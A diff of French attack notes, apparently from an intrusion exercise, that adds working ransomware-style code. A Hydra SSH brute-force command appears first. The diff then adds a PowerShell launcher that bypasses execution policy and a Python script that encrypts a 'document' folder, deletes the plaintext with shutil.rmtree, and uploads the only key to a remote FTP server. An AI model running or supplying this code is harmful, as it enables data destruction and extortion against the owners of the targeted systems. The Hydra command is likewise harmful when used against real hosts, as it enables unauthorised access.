@@ -44,36 +44,110 @@ hydra -l admin -P /home/user/liste_mots_de_passe.txt ssh://192.168.1.10 -t 4 -V
 
 Exploitation :  
 
+Ci-dessous, deux scripts séparés :
 
-Ci-dessous un exemple de script Python « tout-en-un » qui :
+- Le premier script est un script PowerShell pour un serveur Windows qui :
+  1. Vérifie si Python 3 est installé, et l'installe si nécessaire (via winget, disponible sur Windows 10/11 récents avec App Installer).
+  2. Installe le package `cryptography` avec pip.
+  3. Lance le script Python.
 
-1. Vérifie la présence de la dépendance `cryptography`.  
-2. Si elle n’est pas installée, le script l’installe automatiquement via `pip`.  
-3. Ensuite, il exécute le code principal (génération de clé, chiffrement, etc.).
+- Le second script est le script Python qui :
+  1. Génère une clé de chiffrement.
+  2. Compresse et chiffre le dossier `document`.
+  3. Supprime les données non chiffrées.
+  4. Demande les informations FTP et transfère la clé sur le serveur FTP.
 
-Ce script suppose que :  
-- Vous avez un accès à internet sur le serveur.  
-- `pip` est disponible sur le serveur (la plupart des environnements Python récents incluent `pip`).  
-- Les autres modules utilisés (`ftplib`, `tarfile`, `getpass`, `os`) font partie de la bibliothèque standard de Python et n’ont pas besoin d’être installés.
 
-### Script complet
+### Script 1 : PowerShell (setup.ps1)
+
+Ce script suppose que vous êtes sur Windows 10/11 avec `winget` déjà disponible. Si vous n’avez pas `winget`, vous devrez installer Python manuellement.
+
+Sauvegardez ce script dans un fichier `setup.ps1`.
+
+```powershell
+Param(
+    [Parameter(Mandatory=$false)]
+    [string]$PythonPath = "python"
+)
+
+# Vérifier si Python est installé
+Write-Host "[*] Vérification de la présence de Python..."
+
+$pythonExists = $false
+try {
+    & $PythonPath --version
+    $pythonExists = $true
+} catch {
+    $pythonExists = $false
+}
+
+if (-not $pythonExists) {
+    Write-Host "[*] Python n'est pas installé. Installation en cours via winget..."
+    # Installe Python 3.x via winget
+    # NOTE : Assurez-vous d'avoir winget installé
+    winget install -e --id Python.Python.3.11 -h
+    Write-Host "[+] Python installé."
+}
+
+# Re-vérification après installation
+try {
+    & $PythonPath --version
+    Write-Host "[+] Python est prêt à l'emploi."
+} catch {
+    Write-Host "[!] Impossible d'utiliser Python. Installez-le manuellement."
+    exit 1
+}
+
+Write-Host "[*] Installation du module cryptography..."
+try {
+    & $PythonPath -m pip install --upgrade pip
+    & $PythonPath -m pip install cryptography
+    Write-Host "[+] Le module cryptography est installé."
+} catch {
+    Write-Host "[!] Échec de l'installation du module cryptography."
+    exit 1
+}
+
+Write-Host "[*] Exécution du script Python..."
+& $PythonPath script.py
+```
+
+**Instructions :**  
+- Placez ce script `setup.ps1` dans le même dossier que le script Python `script.py` (voir ci-dessous).  
+- Exécutez-le dans PowerShell (en ayant les droits nécessaires) :  
+  ```powershell
+  Set-ExecutionPolicy Bypass -Scope Process -Force
+  .\setup.ps1
+  ```
+  
+Le script va :  
+- Installer Python s’il n’est pas présent (via winget).  
+- Mettre à jour pip et installer cryptography.  
+- Lancer le script Python ci-dessous.
+
+### Script 2 : Python (script.py)
+
+Ce script doit se trouver dans le même répertoire que `setup.ps1`. Il :
+
+- Génère une clé de chiffrement.
+- Compresse le dossier `document` (doit exister dans le même répertoire).
+- Chiffre l’archive.
+- Supprime le dossier original et l’archive non chiffrée.
+- Demande les infos FTP et envoie la clé sur le serveur FTP.
 
 ```python
 import sys
-import subprocess
 import os
 import tarfile
 import getpass
+import shutil
 from ftplib import FTP
 
-# Vérification/installation des dépendances
 try:
     from cryptography.fernet import Fernet
 except ImportError:
-    print("[*] Le module 'cryptography' n'est pas installé. Installation en cours...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
-    # Réessayer l'import après installation
-    from cryptography.fernet import Fernet
+    print("Le module cryptography n'est pas installé, arrêt.")
+    sys.exit(1)
 
 def compress_directory(directory_path, archive_name):
     """
@@ -100,7 +174,7 @@ def upload_key_ftp(ftp_host, ftp_user, ftp_password, local_key_file, remote_key_
     ftp = FTP(ftp_host)
     ftp.login(ftp_user, ftp_password)
     with open(local_key_file, 'rb') as f:
-        ftp.storbinary(f"STOR {remote_key_file}", f)
+        ftp.storbinary("STOR {}".format(remote_key_file), f)
     ftp.quit()
 
 def main():
@@ -111,36 +185,35 @@ def main():
         f.write(key)
     print(f"[+] Clé de chiffrement générée et enregistrée dans {key_file}")
 
-    # 2. Demander à l'utilisateur de choisir un dossier à chiffrer
-    directory_to_encrypt = input("Entrez le chemin du dossier à chiffrer : ").strip()
+    # Dossier à chiffrer
+    directory_to_encrypt = "document"
     if not os.path.isdir(directory_to_encrypt):
-        print("Le chemin spécifié n'est pas un répertoire valide.")
+        print(f"Le dossier '{directory_to_encrypt}' n'existe pas dans ce répertoire.")
         return
 
-    # 3. Compression du dossier
+    # 2. Compression du dossier
     archive_name = "data_to_encrypt.tar.gz"
     compress_directory(directory_to_encrypt, archive_name)
-    print(f"[+] Dossier {directory_to_encrypt} compressé dans {archive_name}")
+    print(f"[+] Dossier '{directory_to_encrypt}' compressé dans {archive_name}")
 
-    # 4. Chiffrement de l'archive
+    # 3. Chiffrement de l'archive
     encrypted_file = "data_encrypted.enc"
     encrypt_file(key, archive_name, encrypted_file)
     print(f"[+] Fichier {archive_name} chiffré dans {encrypted_file}")
 
-    # (Optionnel) Supprimer l’archive non chiffrée
+    # 4. Suppression des fichiers non chiffrés
     os.remove(archive_name)
+    shutil.rmtree(directory_to_encrypt)
+    print(f"[+] Le dossier original '{directory_to_encrypt}' et l'archive non chiffrée ont été supprimés.")
 
     # 5. Exporter la clé vers le serveur FTP
     ftp_host = input("Entrez l'IP/nom du serveur FTP : ").strip()
     ftp_user = input("Nom d'utilisateur FTP : ").strip()
     ftp_password = getpass.getpass("Mot de passe FTP : ")
 
-    remote_key_file = "encryption_key.key"  # Nom du fichier distant, à adapter
+    remote_key_file = "encryption_key.key"  # Nom du fichier distant
     upload_key_ftp(ftp_host, ftp_user, ftp_password, key_file, remote_key_file)
     print(f"[+] Clé {key_file} envoyée sur le serveur FTP {ftp_host} en tant que {remote_key_file}")
-
-    # Optionnel : supprimer la clé locale si on ne veut pas la garder
-    # os.remove(key_file)
 
     print("[+] Opération terminée avec succès.")
 
@@ -148,16 +221,11 @@ if __name__ == "__main__":
     main()
 ```
 
-### Comment utiliser ce script ?
+### Fonctionnement
 
-- Copiez-le dans un fichier `script.py`.  
-- Sur le serveur, exécutez :  
-  ```bash
-  python3 script.py
-  ```  
-- Le script va vérifier si `cryptography` est installé. Si non, il va l’installer.  
-- Puis il vous demandera le chemin du dossier à chiffrer, l’adresse du serveur FTP, ainsi que vos identifiants FTP.
-  
-Une fois terminé, vous aurez :  
-- Le fichier chiffré (`data_encrypted.enc`) localement.  
-- La clé de chiffrement (`encryption_key.key`) envoyée sur le serveur FTP.
+- Préparez un dossier `document` dans le même répertoire que `setup.ps1` et `script.py`.  
+- Exécutez `setup.ps1` dans PowerShell.  
+- Le script installera Python (si nécessaire), cryptography, puis exécutera `script.py`.  
+- Le script Python chiffre le dossier, supprime les données en clair, et transfère la clé sur le serveur FTP indiqué.
+
+Ainsi, les tâches sont séparées en deux scripts : le premier pour la mise en place de l’environnement Python et des dépendances, et le second pour l’opération de chiffrement proprement dite.
